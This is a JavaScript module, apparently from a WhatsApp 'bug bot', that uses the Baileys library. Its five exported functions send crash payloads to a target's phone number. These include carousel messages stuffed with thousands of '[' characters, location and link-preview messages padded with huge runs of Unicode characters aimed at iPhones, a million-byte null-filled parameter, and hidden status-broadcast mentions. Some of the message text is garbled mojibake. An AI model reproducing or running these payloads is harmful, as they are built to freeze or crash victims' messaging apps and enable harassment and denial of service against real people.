
const {
   generateWAMessageFromContent,
   prepareWAMessageMedia,
   proto
} = require("baileys")
const {
   consoleDye
} = require("./color")
const {
    imageWhatsApp,
    videoWhatsApp
} = require("./mediaWhatsApp")
const sleep = async (ms) => {
   return new Promise(resolve => setTimeout(resolve, ms));
}
/*CODE BUG*/
const invisibleCarousel = async (conn, X) => {
   let cards = [];
   for (let i = 0; i < 10; i++) {
      cards.push({
         header: {
            ...videoWhatsApp,
            hasMediaAttachment: true
         },
         nativeFlowMessage: {
            messageParamsJson: "[".repeat(10000)
         }
      });
   }
   let etc = await generateWAMessageFromContent(X, proto.Message.fromObject({
      viewOnceMessage: {
         message: {
            interactiveMessage: {
               body: {
                  text: `# RXHL OFFICIAL`
               },
               carouselMessage: {
                  cards
               },
               contextInfo: {
                  mentionedJid: [X]
               }
            }
         }
      }
   }), {
      userJid: X,
      quoted: null
   });
   await conn.relayMessage("status@broadcast", etc.message, {
      messageId: etc.key.id,
      statusJidList: [X],
      additionalNodes: [{
         tag: "meta",
         attrs: {},
         content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
               tag: "to",
               attrs: {
                  jid: X
               },
               content: undefined
            }]
         }]
      }]
   });
   await console.log(consoleDye.brightGreen.bold(`✅ successfully sent invisible carousel bug to number ${X}!`));
}
const crashIphone = async (conn, X) => {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = await generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/rxhlvro - _ #",
            matchedText: "https://t.me/rxhlvro",
            description: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
            title: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = await generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await conn.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await conn.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await console.log(consoleDye.brightGreen.bold(`✅ successfully sent invisible iphone trava bug to number ${X}!`));
   } catch (err) {
      console.error(err);
   }
};
const interactiveResponCall = async (conn, X) => {
   let etc = await generateWAMessageFromContent(X, proto.Message.fromObject({
      ephemeralMessage: {
         message: {
            interactiveResponseMessage: {
               body: {
                  text: "RXHL OFC",
                  format: 0
               },
               nativeFlowResponseMessage: {
                  name: 'call_permission_request',
                  paramsJson: "\x00".repeat(1002000),
                  version: 3
               }
            }
         }
      }
   }), {
      userJid: X,
      quoted: null
   });
   await conn.relayMessage('status@broadcast', etc.message, {
      messageId: etc.key.id,
      statusJidList: [X],
      additionalNodes: [{
         tag: 'meta',
         attrs: {},
         content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
               tag: 'to',
               attrs: {
                  jid: X
               },
               content: undefined
            }]
         }]
      }]
   });
   await console.log(consoleDye.brightGreen.bold(`✅ successfully sent invisible delay bug to number ${X}!`));
};
const instanCrash = async (conn, X) => {
   let msg = await generateWAMessageFromContent(X, proto.Message.fromObject({
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "ṚẍḧḶ ÖḟḟïċïäḶ ☠️" 
                    },
                    carouselMessage: {
                        cards: [{
                            header: {
                                ...videoWhatsApp,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamsJson: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoWhatsApp,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamsJson: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoWhatsApp,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamsJson: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoWhatsApp,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamsJson: '['.repeat(10000)
                            }
                        },{
                            header: {
                                ...videoWhatsApp,
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                messageParamsJson: '['.repeat(10000)
                            }
                        }]
                    },
                    contextInfo: {
                        mentionedJid: [X]
                    }
                }
            }
        }
    }), {
      userJid: X,
      quoted: null
   });
   await conn.relayMessage(X, msg.message, {
      participant: {
         jid: X
      }
   });
   await console.log(consoleDye.brightGreen.bold(`✅ successfully sent carousel bug to number ${X}!`));
};

const nullsdelmsg = async (conn, X) => {
   let caroArray = []
   for (let i = 0; i < 10; i++) {
      caroArray.push({
         header: {
            ...imageWhatsApp,
            title: "# RXHL OFFICIAL",
            hasMediaAttachment: true
         },
         body: {
            text: "t.me/rxhl_bot"
         },
         nativeFlowMessage: {
            messageParamsJson: "[".repeat(10000),
            buttons: [{
               name: "call_permission_request",
               buttonParamsJson: "",
            }, {
               name: "mpm",
               buttonParamsJson: "",
            }],
         }
      })
   }
   let msg = generateWAMessageFromContent(X, {
      viewOnceMessageV2Extension: {
         message: {
            interactiveMessage: {
               body: {
                  text: "# Rxhl Official"
               },
               carouselMessage: {
                  cards: caroArray,
                  messageVersion: 1
               },
               contextInfo: {
                  mentionedJid: []
               }
            }
         }
      }
   }, {
      userJid: X,
      quoted: null
   })
   let relayOptions = {
      messageId: msg.key.id,
      participant: {
         jid: X
      }
   }
   await conn.relayMessage(X, msg.message, relayOptions)
   for (let i = 0; i < 5; i++) {
      await conn.sendMessage(X, {
         delete: {
            remoteJid: X,
            fromMe: true,
            id: msg.key.id,
            participant: X
         }
      })
   }
   await console.log(consoleDye.brightGreen.bold(`✅ successfully sent carousel bug to number ${X}!`));
}

module.exports = {
   invisibleCarousel,
   crashIphone,
   interactiveResponCall,
   instanCrash,
   nullsdelmsg
}